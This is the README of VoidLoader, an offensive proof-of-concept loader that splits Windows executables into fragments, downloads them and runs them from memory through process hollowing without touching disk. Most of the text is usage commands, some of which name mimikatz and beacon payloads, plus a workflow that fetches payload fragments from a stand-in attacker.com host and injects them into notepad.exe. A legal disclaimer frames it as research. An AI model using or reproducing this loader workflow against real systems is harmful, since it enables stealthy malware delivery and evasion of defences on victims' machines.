# Void Loader - Fractionated Binary Execution PoC

<img width="1280" height="457" alt="image" src="https://github.com/user-attachments/assets/dea4b871-6c90-41d8-9974-5d2616ec5de3" />

## Overview

VoidLoader is a proof-of-concept implementation inspired by the "Fractionated Cavity Infector" technique from vx-underground's Black Mass Volume I. This PoC demonstrates fractionated binary distribution, in-memory mount & execution.

The toolkit splits PE executables into multiple fragments, distributes them across different locations, and reconstructs them entirely in memory for execution—without touching the disk.

## Components

- **MainLib**: Shared core functionality
- **Spliter**: Splits PE binaries into N parts with cryptographic checksums
- **Mounter**: Downloads fragments, reconstructs in memory, and executes via multiple techniques
  - **MounterCLI**: A CLI for run a simple loader
  - **MounterLib**: Core library with execution methods (Local PE, Process Hollowing, Thread Hijacking)
- **Demo**: Example implementations showing direct MounterLib usage

## Build

### Basic Build

```bash
cargo build --release
```

This generates three binaries:
- `target/release/spliter.exe` - Binary splitter tool
- `target/release/mounter.exe` - Fragment loader and executor
- `target/release/demo.exe` - Example implementation

## Usage

### 1. Splitting a Binary

The spliter tool divides an executable into multiple fragments, each with a verification header containing checksums and metadata.

```bash
# Split into 3 parts (default)
./target/release/spliter.exe payload.exe

# Split into 5 parts with custom output directory
./target/release/spliter.exe payload.exe --pieces 5 --output ./fragments

# Split with custom name prefix
./target/release/spliter.exe mimikatz.exe --pieces 10 --name beacon
```

**Output example:**
```
File split successfully into 5 parts
  Output directory: .
  File pattern: payload.part000, payload.part001, ...
```

Each fragment contains a 96-byte header with magic bytes (`SPLT`), part numbers, and SHA256 checksums for integrity validation.

### 2. Loading and Executing Fragments

The mounter downloads fragments from URLs, validates their integrity, reconstructs the binary in memory, and executes it using multiple techniques (Local PE or Process Hollowing).

```bash
# Basic usage - download and execute
./target/release/mounter.exe \
  -u http://192.168.1.100/payload.part000 \
  -u http://192.168.1.100/payload.part001 \
  -u http://192.168.1.100/payload.part002

# Multiple URLs with comma separation
./target/release/mounter.exe -u http://server.com/file.part000,http://server.com/file.part001

# With custom timeout (default: 30s)
./target/release/mounter.exe -u url1,url2,url3 --timeout 60

# Dry-run mode (download and validate only, no execution)
./target/release/mounter.exe -u url1,url2,url3 --dry-run

# Verbose output
./target/release/mounter.exe -u url1,url2 --verbose

# Execution Methods (-m flag)
# Default: local-pe (direct in-memory execution)
./target/release/mounter.exe -u url1,url2 -m local-pe

# Process Hollowing (requires --target and x64 PE)
./target/release/mounter.exe -u url1,url2 -m process-hollowing --target "C:\Windows\System32\notepad.exe"
```

**Complete workflow example:**
```bash
# 1. Split your payload
./target/release/spliter.exe beacon.exe --pieces 3

# 2. Host fragments on a web server
python -m http.server 8000

# 3. Execute from another machine
./target/release/mounter.exe \
  -u http://attacker.com:8000/beacon.part000 \
  -u http://attacker.com:8000/beacon.part001 \
  -u http://attacker.com:8000/beacon.part002 \
  -m process_hollowing --target notepad.exe
```

The binary is reconstructed entirely in RAM and injected into a suspended Windows process (Mittre T1055) without ever being written to disk.

### 3. Demo Example

The `demo` binary shows how to use the VoidLoader libraries directly without CLI arguments. It downloads two fragments from localhost, reconstructs them, and executes the resulting binary.

```bash
# Run the demo (expects fragments on http://127.0.0.1/)
./target/release/demo.exe
```

The demo code can be found in `crates/demo/src/main.rs` and demonstrates direct usage of:
- `download::http::download_all_as_map()` - Download fragments
- `reconstruct::rebuild_from_parts()` - Reconstruct binary
- `execution::local_pe::inject_and_execute()` - Execute in memory

## References

- [Black Mass Volume I - vx-underground](https://vx-underground.org/Papers/VXUG%20Zines)
- [Process Hollowing - MITRE ATT&CK T1055.012](https://attack.mitre.org/techniques/T1055/012/)

## Legal Disclaimer

This tool is provided "as is" for educational and security research purposes only. The authors are not responsible for misuse. Users are solely responsible for compliance with applicable laws in their jurisdiction.

**DO NOT USE THIS TOOL ON SYSTEMS WITHOUT EXPLICIT AUTHORISATION.**

